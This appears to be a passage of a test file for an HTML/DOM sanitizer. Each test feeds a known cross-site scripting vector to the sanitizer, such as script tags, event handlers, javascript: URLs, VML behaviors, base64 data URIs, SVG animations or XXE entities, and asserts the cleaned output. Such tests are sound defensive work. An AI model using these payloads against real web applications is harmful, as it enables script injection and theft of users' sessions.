  let payload = "<div id=\"16\">X<x style=`behavior:url(#default#time2)` onbegin=`alert(16)` >//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"16\">X//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"17\"><?xml-stylesheet href=\"javascript:alert(17)\"?><root/>//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"17\">//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"18\"><script xmlns=\"http://www.w3.org/1999/xhtml\">alert(1)</script>//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"18\">//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"19\"><meta charset=\"x-mac-farsi\">¼script ¾alert(19)//¼/script ¾//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"19\">¼script ¾alert(19)//¼/script ¾//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"20\"><script>ReferenceError.prototype.__defineGetter__('name', function(){alert(20)}),x</script>//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"20\">//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"21\"><script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(21)')()</script>//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"21\">//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"22\"><input onblur=focus() autofocus><input>//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"22\"><input><input>//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"23\"><form id=foobar onforminput=alert(23)><input></form><button form=test onformchange=alert(2)>X</button>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"23\"><form id=\"foobar\"><input></form><button>X</button>//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"23\"><form id=\"foobar\"><input><button>X</button>//[\"'`--&gt;]]&gt;]</form></div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"24\">1<set/xmlns=`urn:schemas-microsoft-com:time` style=`behAvior:url(#default#time2)` attributename=`innerhtml` to=`<img/src=\"x\"onerror=alert(24)>`>//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"24\">1`&gt;//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"25\"><script src=\"#\">{alert(25)}</script>;1//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"25\">;1//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"26\">+ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),alert(RegExp.input);//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"26\">+ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),alert(RegExp.input);//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"27\"><style>p[foo=bar{}*{-o-link:'javascript:alert(27)'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>//[\"'`-->]]>]</div><div id=\"28\">1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2)  attributename=innerhtml values=<img/src=\".\"onerror=alert(28)>>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"27\"><style>p[foo=bar{}*{-o-link:'javascript:alert(27)'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>//[\"'`--&gt;]]&gt;]</div><div id=\"28\">1&gt;//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"29\"><link rel=stylesheet href=data:,*%7bx:expression(alert(29))%7d//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"29\">]]&gt;]</div>"].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"30\"><style>@import \"data:,*%7bx:expression(alert(30))%7D\";</style>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"30\"><style>@import \"data:,*%7bx:expression(alert(30))%7D\";</style>//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"31\"><frameset onload=alert(31)>//[\"'`-->]]>]</div>"
  assert_true([""].contains(@dom_sanitizer.sanitize(payload)))
}

///|
test {
  let payload = "<div id=\"32\"><table background=\"javascript:alert(32)\"></table>//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"32\"><table></table>//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"33\"><a style=\"pointer-events:none;position:absolute;\"><a style=\"position:absolute;\" onclick=\"alert(33);\">XXX</a></a><a href=\"javascript:alert(2)\">XXX</a>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"33\"><a style=\"pointer-events:none;position:absolute;\"></a><a style=\"position:absolute;\">XXX</a><a>XXX</a>//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"34\">1<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=test.vml#xss></vmlframe>//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"34\">1//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"35\">1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:alert(35) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"35\">1<a href=\"#\"></a>//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"36\"><a style=\"behavior:url(#default#AnchorClick);\" folder=\"javascript:alert(36)\">XXX</a>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"36\"><a style=\"behavior:url(#default#AnchorClick);\">XXX</a>//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"37\"><!--<img src=\"--><img src=x onerror=alert(37)//\">//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"37\"><img src=\"x\">//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"38\"><comment><img src=\"</comment><img src=x onerror=alert(38)//\">//[\"'`-->]]>]</div><div id=\"39\"><!-- up to Opera 11.52, FF 3.6.28 -->"
  assert_true(
    [
      "<div id=\"38\"><img src=\"</comment><img src=x onerror=alert(38)//\">//[\"'`--&gt;]]&gt;]</div><div id=\"39\"></div>",
      "<div id=\"38\"><img src=\"&lt;/comment&gt;&lt;img src=x onerror=alert(38)//\">//[\"'`--&gt;]]&gt;]</div><div id=\"39\"></div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<![><img src=\"]><img src=x onerror=alert(39)//\">"
  assert_true(
    [
      "<img>", "<img src=\"]><img src=x onerror=alert(39)//\">", "<img src=\"]&gt;&lt;img src=x onerror=alert(39)//\">",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<!-- IE9+, FF4+, Opera 11.60+, Safari 4.0.4+, GC7+  -->\n<svg><![CDATA[><image xlink:href=\"]]><img src=x onerror=alert(2)//\"></svg>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<svg>&gt;&lt;image xlink:href=\"</svg><img src=\"x\">//[\"'`--&gt;]]&gt;]",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"40\"><style><img src=\"</style><img src=x onerror=alert(40)//\">//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"40\"><img src=\"x\">//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"41\"><li style=list-style:url() onerror=alert(41)></li>"
  assert_true(
    ["<div id=\"41\"><li style=\"list-style:url()\"></li></div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(41)></div>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div style=\"content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden\"></div>//[\"'`--&gt;]]&gt;]",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"42\"><head><base href=\"javascript://\"/></head><body><a href=\"/. /,alert(42)//#\">XXX</a></body>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"42\"><a href=\"/. /,alert(42)//#\">XXX</a>//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"43\"><?xml version=\"1.0\" standalone=\"no\"?>"
  assert_true(
    ["<div id=\"43\"></div>"].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<html xmlns=\"http://www.w3.org/1999/xhtml\">\n<head>\n<style type=\"text/css\">\n@font-face {font-family: y; src: url(\"font.svg#x\") format(\"svg\");} body {font: 100px \"y\";}\n</style>\n</head>\n<body>Hello</body>\n</html>//[\"'`-->]]>]</div>"
  assert_true(
    ["Hello\n//[\"'`--&gt;]]&gt;]"].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"44\"><style>*[{}@import'test.css?]{color: green;}</style>X//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"44\"><style>*[{}@import'test.css?]{color: green;}</style>X//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"45\"><div style=\"font-family:'foo[a];color:red;';\">XXX</div>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"45\"><div style=\"font-family:'foo[a];color:red;';\">XXX</div>//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"46\"><div style=\"font-family:foo}color=red;\">XXX</div>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"46\"><div style=\"font-family:foo}color=red;\">XXX</div>//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"47\"><svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(47)</script></svg>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"47\"><svg xmlns=\"http://www.w3.org/2000/svg\"></svg>//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"48\"><SCRIPT FOR=document EVENT=onreadystatechange>alert(48)</SCRIPT>//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"48\">//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"49\"><OBJECT CLASSID=\"clsid:333C7BC4-460F-11D0-BC04-0080C7055A83\"><PARAM NAME=\"DataURL\" VALUE=\"javascript:alert(49)\"></OBJECT>//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"49\">//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"50\"><object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"50\">//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"51\"><embed src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></embed>//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"51\">//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"52\"><x style=\"behavior:url(test.sct)\">//[\"'`-->]]>]</div><div id=\"53\"><xml id=\"xss\" src=\"test.htc\"></xml>"
  assert_true(
    ["<div id=\"52\">//[\"'`--&gt;]]&gt;]</div><div id=\"53\"></div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<label dataformatas=\"html\" datasrc=\"#xss\" datafld=\"payload\"></label>//[\"'`-->]]>]</div>"
  assert_true(
    ["<label></label>//[\"'`--&gt;]]&gt;]"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"54\"><script>[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"54\">//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"55\"><video><source onerror=\"alert(55)\">//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"55\"><video><source>//[\"'`--&gt;]]&gt;]</video></div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"56\"><video onerror=\"alert(56)\"><source></source></video>//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"56\"><video><source></video>//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"57\"><b <script>alert(57)//</script>0</script></b>//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"57\"><b>alert(57)//0</b>//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"58\"><b><script<b></b><alert(58)</script </b></b>//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"58\"><b></b>//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"59\"><div id=\"div1\"><input value=\"``onmouseover=alert(59)\"></div> <div id=\"div2\"></div><script>document.getElementById(\"div2\").innerHTML = document.getElementById(\"div1\").innerHTML;</script>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"59\"><div id=\"div1\"><input value=\"``onmouseover=alert(59)\"></div> <div id=\"div2\"></div>//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"60\"><div style=\"[a]color[b]:[c]red\">XXX</div>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"60\"><div style=\"[a]color[b]:[c]red\">XXX</div>//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"62\"><!-- IE 6-8 -->\n<x '=\"foo\"><x foo='><img src=x onerror=alert(62)//'>\n<!-- IE 6-9 -->\n<! '=\"foo\"><x foo='><img src=x onerror=alert(2)//'>\n<? '=\"foo\"><x foo='><img src=x onerror=alert(3)//'>//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"62\">\n\n\n\n//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"63\"><embed src=\"javascript:alert(63)\"></embed> // O10.10↓, OM10.0↓, GC6↓, FF\n<img src=\"javascript:alert(2)\">\n<image src=\"javascript:alert(2)\"> // IE6, O10.10↓, OM10.0↓\n<script src=\"javascript:alert(3)\"></script> // IE6, O11.01↓, OM10.1↓//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"63\"> // O10.10↓, OM10.0↓, GC6↓, FF\n<img>\n<img> // IE6, O10.10↓, OM10.0↓\n // IE6, O11.01↓, OM10.1↓//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"64\"><!DOCTYPE x[<!ENTITY x SYSTEM \"http://html5sec.org/test.xxe\">]><y>&x;</y>//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"64\">]&gt;&amp;x;//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"65\"><svg onload=\"javascript:alert(65)\" xmlns=\"http://www.w3.org/2000/svg\"></svg>//[\"'`-->]]>]</div><div id=\"66\"><?xml version=\"1.0\"?>"
  assert_true(
    [
      "<div id=\"65\"><svg xmlns=\"http://www.w3.org/2000/svg\"></svg>//[\"'`--&gt;]]&gt;]</div><div id=\"66\"></div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<?xml-stylesheet type=\"text/xsl\" href=\"data:,%3Cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='xss'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3Ealert(66)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E\"?>\n<root/>//[\"'`-->]]>]</div>\n<div id=\"67\"><!DOCTYPE x [\n    <!ATTLIST img xmlns CDATA \"http://www.w3.org/1999/xhtml\" src CDATA \"xx\"\n onerror CDATA \"alert(67)\"\n onload CDATA \"alert(2)\">\n]><img />//[\"'`-->]]>]</div>"
  assert_true(
    [
      "//[\"'`--&gt;]]&gt;]\n<div id=\"67\">\n]&gt;<img>//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"68\"><doc xmlns:xlink=\"http://www.w3.org/1999/xlink\" xmlns:html=\"http://www.w3.org/1999/xhtml\">\n    <html:style /><x xlink:href=\"javascript:alert(68)\" xlink:type=\"simple\">XXX</x>\n</doc>//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"68\">\n    XXX\n//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"69\"><card xmlns=\"http://www.wapforum.org/2001/wml\"><onevent type=\"ontimer\"><go href=\"javascript:alert(69)\"/></onevent><timer value=\"1\"/></card>//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"69\">//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"70\"><div style=width:1px;filter:glow onfilterchange=alert(70)>x</div>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"70\"><div style=\"width:1px;filter:glow\">x</div>//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"71\"><// style=x:expression\u{02}8alert(71)\u{02}9>//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"71\">//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"72\"><form><button formaction=\"javascript:alert(72)\">X</button>//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"72\"><form><button>X</button>//[\"'`--&gt;]]&gt;]</form></div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"73\"><event-source src=\"event.php\" onload=\"alert(73)\">//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"73\">//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"74\"><a href=\"javascript:alert(74)\"><event-source src=\"data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A\" /></a>//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"74\"><a></a>//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"75\"><script<{alert(75)}/></script </>//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"75\">//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"76\"><?xml-stylesheet type=\"text/css\"?><!DOCTYPE x SYSTEM \"test.dtd\"><x>&x;</x>//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"76\">&amp;x;//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"77\"><?xml-stylesheet type=\"text/css\"?><root style=\"x:expression(alert(77))\"/>//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"77\">//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"78\"><?xml-stylesheet type=\"text/xsl\" href=\"#\"?><img xmlns=\"x-schema:test.xdr\"/>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"78\"><img xmlns=\"x-schema:test.xdr\">//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"79\"><object allowscriptaccess=\"always\" data=\"x\"></object>//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"79\">//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"80\"><style>*{x:ｅｘｐｒｅｓｓｉｏｎ(alert(80))}</style>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"80\"><style>*{x:ｅｘｐｒｅｓｓｉｏｎ(alert(80))}</style>//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"81\"><x xmlns:xlink=\"http://www.w3.org/1999/xlink\" xlink:actuate=\"onLoad\" xlink:href=\"javascript:alert(81)\" xlink:type=\"simple\"/>//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"81\">//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"82\"><?xml-stylesheet type=\"text/css\" href=\"data:,*%7bx:expression(write(2));%7d\"?>//[\"'`-->]]>]</div><div id=\"83\"><x:template xmlns:x=\"http://www.wapforum.org/2001/wml\"  x:ontimer=\"$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(83)\"><x:timer value=\"1\"/></x:template>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"82\">//[\"'`--&gt;]]&gt;]</div><div id=\"83\">//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"84\"><x xmlns:ev=\"http://www.w3.org/2001/xml-events\" ev:event=\"load\" ev:handler=\"javascript:alert(84)//#x\"/>//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"84\">//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"85\"><x xmlns:ev=\"http://www.w3.org/2001/xml-events\" ev:event=\"load\" ev:handler=\"test.evt#x\"/>//[\"'`-->]]>]</div>"
  assert_true(
    ["<div id=\"85\">//[\"'`--&gt;]]&gt;]</div>"].contains(
      @dom_sanitizer.sanitize(payload),
    ),
  )
}

///|
test {
  let payload = "<div id=\"86\"><body oninput=alert(86)><input autofocus>//[\"'`-->]]>]</div><div id=\"87\"><svg xmlns=\"http://www.w3.org/2000/svg\">\n<a xmlns:xlink=\"http://www.w3.org/1999/xlink\" xlink:href=\"javascript:alert(87)\"><rect width=\"1000\" height=\"1000\" fill=\"white\"/></a>\n</svg>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"86\"><input>//[\"'`--&gt;]]&gt;]</div><div id=\"87\"><svg xmlns=\"http://www.w3.org/2000/svg\">\n<a xmlns:xlink=\"http://www.w3.org/1999/xlink\"><rect width=\"1000\" height=\"1000\" fill=\"white\"></rect></a>\n</svg>//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"89\"><svg xmlns=\"http://www.w3.org/2000/svg\">\n<set attributeName=\"onmouseover\" to=\"alert(89)\"/>\n<animate attributeName=\"onunload\" to=\"alert(89)\"/>\n</svg>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"89\"><svg xmlns=\"http://www.w3.org/2000/svg\">\n\n\n</svg>//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"90\"><!-- Up to Opera 10.63 -->\n<div style=content:url(test2.svg)></div>\n\n<!-- Up to Opera 11.64 - see link below -->\n\n<!-- Up to Opera 12.x -->\n<div style=\"background:url(test5.svg)\">PRESS ENTER</div>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"90\">\n<div style=\"content:url(test2.svg)\"></div>\n\n\n\n\n<div style=\"background:url(test5.svg)\">PRESS ENTER</div>//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"91\">[A]\n<? foo=\"><script>alert(91)</script>\">\n<! foo=\"><script>alert(91)</script>\">\n</ foo=\"><script>alert(91)</script>\">\n[B]\n<? foo=\"><x foo='?><script>alert(91)</script>'>\">\n[C]\n<! foo=\"[[[x]]\"><x foo=\"]foo><script>alert(91)</script>\">\n[D]\n<% foo><x foo=\"%><script>alert(91)</script>\">//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"91\">[A]\n\"&gt;\n\"&gt;\n\"&gt;\n[B]\n\"&gt;\n[C]\n\n[D]\n&lt;% foo&gt;//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"92\"><div style=\"background:url(http://foo.f/f oo/;color:red/*/foo.jpg);\">X</div>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"92\"><div style=\"background:url(http://foo.f/f oo/;color:red/*/foo.jpg);\">X</div>//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"93\"><div style=\"list-style:url(http://foo.f)\u{10}url(javascript:alert(93));\">X</div>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"93\"><div style=\"list-style:url(http://foo.f)\u{10}url(javascript:alert(93));\">X</div>//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"94\"><svg xmlns=\"http://www.w3.org/2000/svg\">\n<handler xmlns:ev=\"http://www.w3.org/2001/xml-events\" ev:event=\"load\">alert(94)</handler>\n</svg>//[\"'`-->]]>]</div>"
  assert_true(
    [
      "<div id=\"94\"><svg xmlns=\"http://www.w3.org/2000/svg\">\n\n</svg>//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"94\"><svg xmlns=\"http://www.w3.org/2000/svg\">\nalert(94)\n</svg>//[\"'`--&gt;]]&gt;]</div>",
      "<div id=\"94\"><svg xmlns=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/2000/svg\">\n\n</svg>//[\"'`--&gt;]]&gt;]</div>",
    ].contains(@dom_sanitizer.sanitize(payload)),
  )
}

///|
test {
  let payload = "<div id=\"95\"><svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<feImage>\n<set attributeName=\"xlink:href\" to=\"data:image/svg+xml;charset=utf-8;base64,\nPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D\"/>\n</feImage>\n</svg>//[\"'`-->]]>]</div>"
  assert_true(
    [
